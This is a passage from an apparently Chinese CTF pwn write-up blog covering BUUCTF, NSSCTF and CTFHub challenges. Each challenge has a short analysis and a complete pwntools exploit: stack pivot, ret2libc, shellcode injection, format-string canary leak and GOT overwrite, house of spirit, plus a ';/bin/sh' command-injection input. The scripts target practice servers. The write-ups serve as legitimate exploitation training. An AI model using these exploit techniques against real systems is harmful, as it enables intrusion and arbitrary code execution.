class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="number">27273</span>)</span><br><span class="line">payload = p64(<span class="number">0x144678aadc0e4072</span>) + p64(<span class="number">0x84b6e81a4c7eb0e2</span>)</span><br><span class="line">payload+= p64(<span class="number">0xf426588abcee2052</span>) + p64(<span class="number">0xc8cb2c5e90c2</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250116113535351.png" alt="image-20250116113535351"></p><h2 id="题目8_hdctf-2023keep-on"><a href="#题目8-HDCTF-2023-KEEP-ON" class="headerlink" title="题目8_[HDCTF 2023]KEEP ON"></a>题目8_[HDCTF 2023]KEEP ON</h2><ul><li><p>考点：<code>栈迁移</code></p></li><li><p>拿到附件先查看一下保护机制，发现保护机制没有开Canary和PIE</p></li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250118093552741.png" alt="image-20250118093552741"></p><ul><li>然后使用<code>IDA</code>反编译查看代码，先来查看<code>main</code>函数，发现<code>main</code>函数只有一个输出，和初始化，比较重要的在<code>vuln</code>这个函数中</li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250118093641878.png" alt="image-20250118093641878"></p><ul><li>接下来直接查看<code>vuln</code>这个函数<ul><li>发现有两个<code>read()</code>函数，其中第二个<code>read</code>函数存在溢出，可以溢出<code>0x10</code>个字节。</li><li>然后<code>printf(s)</code>这边还存在字符串格式化漏洞</li></ul></li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250118093735268.png" alt="image-20250118093735268"></p><ul><li>由于可以溢出的空间太小了，所以查看汇编代码，看看是否有<code>leave</code> 和<code>ret</code>这个汇编语句。发现有<code>leave</code>和<code>ret</code>这个汇编语句，这样我们就可以进行栈迁移操作。</li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250118094039753.png" alt="image-20250118094039753"></p><ul><li><p>思路就是：先利用字符串格式化漏洞泄露栈地址，并计算偏移，这样在第二次输入时，在没溢出之前就可以构造rop链，使用栈迁移，将<code>rsp</code>指针回到保存<code>s</code>的变量中，这样我们就可以成功构造rop链。</p></li><li><p>exp如下：</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;node4.anna.nssctf.cn&#x27;,28694)</span></span><br><span class="line">p = process(<span class="string">&#x27;./hdctf&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">payload = <span class="string">b&#x27;%16$p&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;name: \n&#x27;</span>,payload)</span><br><span class="line">stack = p.recvline()[<span class="number">6</span>:-<span class="number">1</span>]</span><br><span class="line">stack = <span class="built_in">int</span>(stack,<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;stack----&gt;&#x27;</span>,<span class="built_in">hex</span>(stack))</span><br><span class="line">stack = stack - <span class="number">0x60</span></span><br><span class="line">leave = <span class="number">0x4007F2</span></span><br><span class="line">pop_rdi =<span class="number">0x4008d3</span></span><br><span class="line">sys_addr = <span class="number">0x40085D</span></span><br><span class="line">ret = <span class="number">0x400864</span></span><br><span class="line">payload1 = p64(stack)+p64(pop_rdi)+p64(stack+<span class="number">0x20</span>)+p64(sys_addr)</span><br><span class="line">payload1 += <span class="string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span></span><br><span class="line">payload1 += p64(stack)+p64(leave)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;keep on !\n&#x27;</span>,payload1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="buuctf"><a href="#BUUCTF" class="headerlink" title="BUUCTF"></a>BUUCTF</h1><h2 id="第一页"><a href="#第一页" class="headerlink" title="第一页"></a>第一页</h2><h2 id="第二页"><a href="#第二页" class="headerlink" title="第二页"></a>第二页</h2><h3 id="题目1_ez_pz_hackover_2016"><a href="#题目1-ez-pz-hackover-2016" class="headerlink" title="题目1_ez_pz_hackover_2016"></a>题目1_ez_pz_hackover_2016</h3><ul><li><p>考点：<code>栈溢出</code>、<code>shellcode</code></p></li><li><p>先查看一下保护机制，保护机制，发现是32位的程序，并且很多保护机制都没有开。</p></li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250219131730677.png" alt="image-20250219131730677"></p><ul><li>之后使用IDA pro反编译一下该程序，发现程序会先进行输入输出初始化</li><li>之后就调用两个函数</li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250219132048373.png" alt="image-20250219132048373"></p><ul><li>接下来就查看<code>header()</code>这个函数,发现这个函数没有任何漏洞点</li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250219132716148.png" alt="image-20250219132716148"></p><ul><li>再看一下<code>chall()</code>,这个函数主要执行的操作为<ul><li>题目先会泄露出<code>s</code>这个数组的地址，即栈上的地址</li><li>向<code>s</code>输入内容这个地方不存在栈溢出</li><li>并且<code>v3</code>这边会查找<code>\n</code>，然后会将<code>\n</code>置<code>\x00</code></li><li>之后会将数组<code>s</code>与<code>crashme</code>进行比较如果两个字符串相等，那么就可以执行<code>vuln</code>这个函数。</li></ul></li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250219132830410.png" alt="image-20250219132830410"></p><ul><li>接下来查看<code>vuln</code>这个函数<ul><li>这个函数会复制<code>0x400</code>字节到<code>dest</code>这个数组中,这个复制的值是从<code>&amp;src</code>注意是保存<code>src</code>地址的栈开始，这边存在栈溢出</li></ul></li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250219174305847.png" alt="image-20250219174305847"></p><ul><li>接下来就是栈溢出的利用了。由于栈可执行，直接往栈上写shellcode然后执行即可</li><li>exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&quot;./ez_pz_hackover_2016&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">27130</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;crash: &#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">stack_addr = p.recvline()[:-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(stack_addr)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(stack_addr.decode(),<span class="number">16</span>)</span><br><span class="line">a = asm(shellcraft.sh())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;a---&gt;&#x27;</span>,<span class="built_in">len</span>(a))</span><br><span class="line">payload = <span class="string">b&#x27;crashme\x00&#x27;</span> + cyclic(<span class="number">0x12</span>)</span><br><span class="line">payload += p32(stack_addr-<span class="number">0x1c</span>)+a</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="题目2_jarvisoj_level3_x64"><a href="#题目2-jarvisoj-level3-x64" class="headerlink" title="题目2_jarvisoj_level3_x64"></a>题目2_jarvisoj_level3_x64</h3><ul><li><p>考点<code>ret2libc</code>这边就不多介绍了，简单栈溢出的<code>ret2libc</code>应用</p></li><li><p>漏洞点就在这里：</p></li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250219220242286.png" alt="image-20250219220242286"></p><ul><li>exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&#x27;./level3_x64&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26355</span>)</span><br><span class="line">pop_rdi = <span class="number">0x4006b3</span></span><br><span class="line">pop_rsi = <span class="number">0x4006b1</span></span><br><span class="line">write_addr = <span class="number">0x4004B0</span></span><br><span class="line">write_got = <span class="number">0x600A58</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(pop_rdi)+p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi)+p64(write_got)+p64(<span class="number">0</span>)+p64(write_addr)+p64(<span class="number">0x4005E6</span>)</span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvline()</span><br><span class="line">write = p.recv()[<span class="number">0</span>:<span class="number">6</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;write_addr--&gt;&#x27;</span>,write)</span><br><span class="line">write = <span class="built_in">int</span>.from_bytes(write,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">libc_addr = write - <span class="number">0xF72B0</span></span><br><span class="line">sh_addr = libc_addr + <span class="number">0x18CD57</span></span><br><span class="line">sys_addr = libc_addr + <span class="number">0x45390</span></span><br><span class="line">payload =  <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(pop_rdi)+p64(sh_addr)+p64(sys_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="题目3_mrctf2020_shellcode"><a href="#题目3-mrctf2020-shellcode" class="headerlink" title="题目3_mrctf2020_shellcode"></a>题目3_mrctf2020_shellcode</h3><ul><li><p>考点<code>ret2shellcode</code></p></li><li><p>简单的<code>ret2shellcode</code>，附件都不用看直接打，模版题。</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./mrctf2020_shellcode&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">27597</span>)</span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="题目4_bjdctf_2020_babyrop2"><a href="#题目4-bjdctf-2020-babyrop2" class="headerlink" title="题目4_bjdctf_2020_babyrop2"></a>题目4_bjdctf_2020_babyrop2</h3><ul><li>考点：<code>ret2libc</code>、<code>格式化字符串漏洞</code>、<code>canary保护</code></li><li>查看一下该附件的保护机制</li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250220104016791.png" alt="image-20250220104016791"></p><ul><li>开了Canary，程序中有格式化字符串漏洞，先要利用该漏洞就可以泄露<code>canary</code>了</li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250220104831301.png" alt="image-20250220104831301"></p><ul><li>现在就可以直接<code>ret2libc</code>了</li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250220104852523.png" alt="image-20250220104852523"></p><ul><li>exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./bjdctf_2020_babyrop2&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28015</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;%7$p&#x27;</span>)</span><br><span class="line">canary = p.recvuntil(<span class="string">b&#x27;I\&#x27;ll give u some gift to help u!\n&#x27;</span>)</span><br><span class="line">canary = p.recvline()[:-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;canary--&gt;&#x27;</span>,canary)</span><br><span class="line">canary = <span class="built_in">int</span>(canary.decode(),<span class="number">16</span>)</span><br><span class="line">pop_rdi=<span class="number">0x400993</span></span><br><span class="line">puts_got = <span class="number">0x601018</span></span><br><span class="line">puts_plt = <span class="number">0x400610</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(canary)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+p64(pop_rdi)</span><br><span class="line">payload += p64(puts_got)+p64(puts_plt)+p64(<span class="number">0x400887</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Pull up your sword and tell me u story!\n&#x27;</span>)</span><br><span class="line">puts_addr = p.recvline()[:-<span class="number">1</span>]</span><br><span class="line">puts_addr = <span class="built_in">int</span>.from_bytes(puts_addr,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">libc_addr = puts_addr - <span class="number">0x6F690</span></span><br><span class="line">sys_addr = libc_addr + <span class="number">0x45390</span></span><br><span class="line">sh_addr = libc_addr + <span class="number">0x18CD57</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr---&gt;&#x27;</span>,puts_addr)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(canary)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+p64(pop_rdi)</span><br><span class="line">payload += p64(sh_addr)+p64(sys_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="题目5_babyheap_0ctf_2017"><a href="#题目5-babyheap-0ctf-2017" class="headerlink" title="题目5_babyheap_0ctf_2017"></a>题目5_babyheap_0ctf_2017</h3><ul><li>考点：</li></ul><h3 id="题目6_bjdctf_2020_router"><a href="#题目6-bjdctf-2020-router" class="headerlink" title="题目6_bjdctf_2020_router"></a>题目6_bjdctf_2020_router</h3><ul><li>考点：<code>命令执行</code></li><li><p>这题的考点其实算是<code>web</code>的，其实学到后面就感觉<code>web</code>和<code>pwn</code>有点不分家，在网络攻防都是占很大一块。</p></li><li><p>我们直接就查看附件，发现选项1会执行命令，并且<code>0x20676E6970</code>就是<code>ping</code>的小端序</p></li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250303120541620.png" alt="image-20250303120541620"></p><ul><li>这时我们就可以使用<code>;</code>进行命令绕过，直接选择选项<code>1</code>然后执行命令<code>;/bin/sh</code>即可<code>getshell</code></li></ul><p><img src="/2025/02/18/CTFblog/PWN%E7%B3%BB%E5%88%97blog/PWN%E5%88%B7%E9%A2%98/image-20250303120704485.png" alt="image-20250303120704485"></p><h2 id="第三页"><a href="#第三页" class="headerlink" title="第三页"></a>第三页</h2><h2 id="第四页"><a href="#第四页" class="headerlink" title="第四页"></a>第四页</h2><h3 id="题目13_ciscn_2019_sw_1"><a href="#题目13-ciscn-2019-sw-1" class="headerlink" title="题目13_ciscn_2019_sw_1"></a>题目13_ciscn_2019_sw_1</h3><ul><li>考点：<code>只能一次格式化字符串</code></li><li>这题之后再来归纳一下格式化字符串漏洞，这题再细讲</li><li>这边也直接贴出exp：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25550</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./ciscn_2019_sw_1&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">pause()</span><br><span class="line">fini_addr = <span class="number">0x804979C</span></span><br><span class="line">main_addr = <span class="number">0x8048534</span></span><br><span class="line">sys_addr = <span class="number">0x80483D0</span></span><br><span class="line">printf_got = <span class="number">0x804989C</span></span><br><span class="line"><span class="comment"># 0x8534</span></span><br><span class="line"><span class="comment"># 0x804   0x83D0</span></span><br><span class="line">payload = <span class="string">b&#x27;%&#x27;</span>+ <span class="built_in">str</span>(<span class="number">0x83d0</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>) + <span class="string">b&#x27;c%14$hn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span>+ <span class="built_in">str</span>(<span class="number">0x8534</span>-<span class="number">0x83D0</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%15$hn&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;%&#x27;</span>+ <span class="built_in">str</span>(<span class="number">0x82D0</span>).encode(<span class="string">&#x27;utf-8&#x27;</span>)+<span class="string">b&#x27;c%16$hnaaa&#x27;</span></span><br><span class="line">payload += p32(printf_got)+p32(fini_addr)+p32(printf_got+<span class="number">2</span>)</span><br><span class="line"><span class="comment">#payload+= b&#x27;%&#x27;+str(0x804).encode(&#x27;utf-8&#x27;)+b&#x27;c%14$hnaaaaaaa&#x27;</span></span><br><span class="line"><span class="comment">#payload+= p32(fini_addr)+p32(fini_addr+2)</span></span><br><span class="line"><span class="comment">#payload= fmtstr_payload(4,&#123;printf_got : sys_addr&#125;)</span></span><br><span class="line"><span class="comment">#payload += b&#x27;%&#x27; + str(0x8534).encode(&#x27;utf-8&#x27;) +</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;len---&gt;&#x27;</span>,<span class="built_in">len</span>(payload))</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment">#payload = fmtstr_payload(4,&#123;&#125;)</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="题目14_lctf2016_pwn200"><a href="#题目14-lctf2016-pwn200" class="headerlink" title="题目14_lctf2016_pwn200"></a>题目14_lctf2016_pwn200</h3><ul><li>考点：<code>house_of_sprirt</code></li><li>这题在<code>house_of_sprirt</code>这边有详细解答，这边就直接给exp。</li><li>exp如下：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&quot;./pwn200&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(b&#x27;node5.buuoj.cn&#x27;,25055)</span></span><br><span class="line">gdb.attach(p,<span class="string">&quot;b *0x400B1F\n b *0x400824\nb *0x400A5F\n b *0x40092C&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaa&#x27;</span></span><br><span class="line">pause()</span><br><span class="line">p.sendafter(<span class="string">b&#x27;who are u?\n&#x27;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;faaaaaaa&#x27;</span>)</span><br><span class="line">stack_addr = p.recvline()</span><br><span class="line"><span class="built_in">print</span>(stack_addr)</span><br><span class="line">stack_addr=stack_addr[:<span class="number">6</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;stack_addr-------&gt;&#x27;</span>,stack_addr)</span><br><span class="line">stack_addr=<span class="built_in">int</span>.from_bytes(stack_addr,<span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">ptr = stack_addr-<span class="number">0xf0</span>+<span class="number">0x40</span></span><br><span class="line">payload1 = <span class="string">b&#x27;48&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;give me your id ~~?\n&#x27;</span>,payload1)</span><br><span class="line"><span class="comment"># payload2构造fake_chunk</span></span><br><span class="line">payload2 = p64(<span class="number">0x0</span>)+p64(<span class="number">0x61</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(ptr)</span><br><span class="line"><span class="comment">#payload2 = b&#x27;aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaa&#x27;#aaaahaaaaaaa&#x27;</span></span><br><span class="line">p.sendafter(<span class="string">b&#x27;give me money~\n&#x27;</span>,payload2)</span><br><span class="line">payload3 = <span class="string">b&#x27;2&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;your choice :&#x27;</span>,payload3)</span><br><span class="line">payload4 = <span class="string">b&#x27;1&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;your choice :&#x27;</span>,payload4)</span><br><span class="line">payload5 = <span class="string">b&#x27;80&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;how long?\n&#x27;</span>,payload5)</span><br><span class="line">a = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rbx,0x0068732f6e69622f</span></span><br><span class="line"><span class="string">    push rbx</span></span><br><span class="line"><span class="string">    mov rdi,rsp</span></span><br><span class="line"><span class="string">    xor rsi,rsi</span></span><br><span class="line"><span class="string">    xor rdx,rdx</span></span><br><span class="line"><span class="string">    mov rax,59</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line">sh = a</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;--------&gt;&quot;</span>,<span class="built_in">len</span>(sh))</span><br><span class="line">payload6 = sh +<span class="string">b&#x27;a&#x27;</span>*<span class="number">3</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span> + p64(ptr)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;give me more money :&#x27;</span>,payload6)</span><br><span class="line">payload = <span class="string">b&#x27;3&#x27;</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;your choice :&#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="题目29_houseoforange_hitcon_2016"><a href="#题目29-houseoforange-hitcon-2016" class="headerlink" title="题目29_houseoforange_hitcon_2016"></a>题目29_houseoforange_hitcon_2016</h3><ul><li><p>考点：<code>house of orange</code></p></li><li><p>这题也在<code>house_of_orange</code>中有具体分析，这边也直接贴出exp</p></li><li>exp如下：</li></ul><h2 id="第五页"><a href="#第五页" class="headerlink" title="第五页"></a>第五页</h2><h3 id="题目28_ogeek2019-finalovm"><a href="#题目28-OGeek2019-Final-OVM" class="headerlink" title="题目28_[OGeek2019 Final]OVM"></a>题目28_[OGeek2019 Final]OVM</h3><ul><li><h1 id="ctfshow"><a href="#CTFshow" class="headerlink" title="CTFshow"></a>CTFshow</h1></li></ul><h1 id="ctfhub"><a href="#CTFHub" class="headerlink" title="CTFHub"></a>CTFHub</h1><h2 id="题目1_house_of_lore"><a href="#题目1-house-of-lore" class="headerlink" title="题目1_house_of_lore"></a>题目1_house_of_lore</h2><ul><li>详解在相应的博客中，这里就贴个<code>exp</code></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;neww&quot;</span>]</span><br><span class="line">libc = ELF(<span 